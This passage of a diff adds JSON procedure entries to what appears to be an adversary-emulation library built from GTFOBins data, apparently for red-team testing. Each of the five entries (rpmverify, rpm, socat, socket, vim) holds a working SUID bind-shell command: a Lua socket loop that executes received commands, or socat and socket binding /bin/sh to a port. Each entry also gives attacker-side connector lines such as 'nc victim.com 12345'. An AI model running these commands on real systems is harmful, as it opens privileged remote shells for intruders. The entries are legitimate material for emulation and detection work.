+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "rpmverify --eval '%{lua:...}'\nlua -e '\n  local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",#{lotl_gtfobins_remote_port}));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/rpmverify",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/rpmverify",
+        "source_bin": "rpmverify",
+        "function": "bind-shell",
+        "function_label": "Bind shell",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": "lua",
+        "inheritance_path": [
+          "rpmverify",
+          "lua"
+        ],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "tty": {
+            "false": "The spawned shell is just a dummy REPL that can only run simple terminal commands."
+          },
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          },
+          "connector": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to connect to the shell.",
+              "code": "nc victim.com 12345"
+            },
+            "tcp-client-tty": {
+              "comment": "A TCP client can be used on the attacker box to receive the shell.",
+              "code": "socat file:/dev/tty,raw,echo=0 tcp:victim.com:12345"
+            }
+          }
+        },
+        "context_metadata": {
+          "shell": true
+        },
+        "procedure_metadata": {
+          "connector": "tcp-client",
+          "inherited_from": "lua",
+          "inheritance_path": [
+            "rpmverify",
+            "lua"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {
+          "connector": "tcp-client"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:rpmverify:bind-shell:0:suid:0:rpmverify>lua",
+        "source_name": "rpmverify",
+        "source_tcodes": [
+          "T1059",
+          "T1071"
+        ],
+        "category": "bind-shell",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `rpmverify` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:rpm:bind-shell:0:suid:0:rpm>lua",
+      "name": "GTFOBINS - T1059 - rpm - Bind shell - Suid [85778fb]",
+      "description": "This executable can bind a system shell to a local port waiting for an attacker to connect. Binary: rpm. Context: SUID. This allows to run Lua code (`...`). Inherits bind-shell behavior from lua. This requires `lua-socket` to be available.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "rpm --eval '%{lua:...}'\nlua -e '\n  local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",#{lotl_gtfobins_remote_port}));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/rpm",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/rpm",
+        "source_bin": "rpm",
+        "function": "bind-shell",
+        "function_label": "Bind shell",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": "lua",
+        "inheritance_path": [
+          "rpm",
+          "lua"
+        ],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "tty": {
+            "false": "The spawned shell is just a dummy REPL that can only run simple terminal commands."
+          },
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          },
+          "connector": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to connect to the shell.",
+              "code": "nc victim.com 12345"
+            },
+            "tcp-client-tty": {
+              "comment": "A TCP client can be used on the attacker box to receive the shell.",
+              "code": "socat file:/dev/tty,raw,echo=0 tcp:victim.com:12345"
+            }
+          }
+        },
+        "context_metadata": {
+          "shell": true
+        },
+        "procedure_metadata": {
+          "connector": "tcp-client",
+          "inherited_from": "lua",
+          "inheritance_path": [
+            "rpm",
+            "lua"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {
+          "connector": "tcp-client"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:rpm:bind-shell:0:suid:0:rpm>lua",
+        "source_name": "rpm",
+        "source_tcodes": [
+          "T1059",
+          "T1071"
+        ],
+        "category": "bind-shell",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `rpm` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:socat:bind-shell:0:suid::",
+      "name": "GTFOBINS - T1059 - socat - Bind shell - Suid [b1a02a7]",
+      "description": "This executable can bind a system shell to a local port waiting for an attacker to connect. Binary: socat. Context: SUID.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "socat tcp-listen:#{lotl_gtfobins_remote_port},reuseaddr,fork 'exec:/bin/sh -p,pty,stderr,setsid,sigint,sane'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/socat",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/socat",
+        "source_bin": "socat",
+        "function": "bind-shell",
+        "function_label": "Bind shell",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "tty": {
+            "false": "The spawned shell is just a dummy REPL that can only run simple terminal commands."
+          },
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          },
+          "connector": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to connect to the shell.",
+              "code": "nc victim.com 12345"
+            },
+            "tcp-client-tty": {
+              "comment": "A TCP client can be used on the attacker box to receive the shell.",
+              "code": "socat file:/dev/tty,raw,echo=0 tcp:victim.com:12345"
+            }
+          }
+        },
+        "context_metadata": {
+          "code": "socat tcp-listen:12345,reuseaddr,fork 'exec:/bin/sh -p,pty,stderr,setsid,sigint,sane'",
+          "shell": false
+        },
+        "procedure_metadata": {
+          "connector": "tcp-client-tty"
+        },
+        "operator_notes": {
+          "connector": "tcp-client-tty"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:socat:bind-shell:0:suid::",
+        "source_name": "socat",
+        "source_tcodes": [
+          "T1059",
+          "T1071"
+        ],
+        "category": "bind-shell",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `socat` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:socket:bind-shell:0:suid::",
+      "name": "GTFOBINS - T1059 - socket - Bind shell - Suid [c525437]",
+      "description": "This executable can bind a system shell to a local port waiting for an attacker to connect. Binary: socket. Context: SUID.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "socket -svp '/bin/sh -i' #{lotl_gtfobins_remote_port}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/socket",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/socket",
+        "source_bin": "socket",
+        "function": "bind-shell",
+        "function_label": "Bind shell",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "tty": {
+            "false": "The spawned shell is just a dummy REPL that can only run simple terminal commands."
+          },
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          },
+          "connector": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to connect to the shell.",
+              "code": "nc victim.com 12345"
+            },
+            "tcp-client-tty": {
+              "comment": "A TCP client can be used on the attacker box to receive the shell.",
+              "code": "socat file:/dev/tty,raw,echo=0 tcp:victim.com:12345"
+            }
+          }
+        },
+        "context_metadata": {
+          "shell": true
+        },
+        "procedure_metadata": {
+          "connector": "tcp-client"
+        },
+        "operator_notes": {
+          "connector": "tcp-client"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:socket:bind-shell:0:suid::",
+        "source_name": "socket",
+        "source_tcodes": [
+          "T1059",
+          "T1071"
+        ],
+        "category": "bind-shell",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `socket` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:vim:bind-shell:0:suid:1:vim>lua",
+      "name": "GTFOBINS - T1059 - vim - Bind shell - Suid [19ecb96]",
+      "description": "This executable can bind a system shell to a local port waiting for an attacker to connect. Binary: vim. Context: SUID. This allows to run Lua code (`...`). Inherits bind-shell behavior from lua. This requires `lua-socket` to be available.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "vim -c ':lua ...'\nlua -e '\n  local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",#{lotl_gtfobins_remote_port}));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/vim",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/vim",
+        "source_bin": "vim",
+        "function": "bind-shell",
+        "function_label": "Bind shell",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": "lua",
+        "inheritance_path": [
+          "vim",
+          "lua"
+        ],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "tty": {
+            "false": "The spawned shell is just a dummy REPL that can only run simple terminal commands."
+          },
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          },
+          "connector": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to connect to the shell.",
+              "code": "nc victim.com 12345"
+            },
+            "tcp-client-tty": {
+              "comment": "A TCP client can be used on the attacker box to receive the shell.",
+              "code": "socat file:/dev/tty,raw,echo=0 tcp:victim.com:12345"
+            }
+          }
+        },
+        "context_metadata": {
+          "shell": true
+        },
+        "procedure_metadata": {
+          "connector": "tcp-client",
+          "inherited_from": "lua",
+          "inheritance_path": [
+            "vim",
+            "lua"
+          ],
+          "inherit_index": 1
+        },
+        "operator_notes": {
+          "connector": "tcp-client"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:vim:bind-shell:0:suid:1:vim>lua",
+        "source_name": "vim",
+        "source_tcodes": [
+          "T1059",
+          "T1071"
+        ],
+        "category": "bind-shell",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `vim` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    }
+  ],
+  "chains": []
+}
